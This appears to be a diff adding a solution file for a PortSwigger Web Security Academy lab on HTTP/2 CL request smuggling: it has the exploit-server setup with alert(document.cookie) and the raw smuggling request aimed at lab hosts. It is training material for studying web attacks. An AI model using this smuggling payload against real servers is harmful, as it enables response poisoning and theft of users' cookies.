@@ -1,0 +1,21 @@
+The HTTP request at the bottom of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
+
+Create path "/resources" on exploit server with the following JavaScript:
+alert(document.cookie)
+
+REQUEST:
+
+---START---
+POST /resources HTTP/2
+Host: 0a51006a040225b4806d854e00e80002.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0afc00cd04f3254580ec84dc013f005d.exploit-server.net
+Content-Length: 20
+
+hello=world
+
+---END---
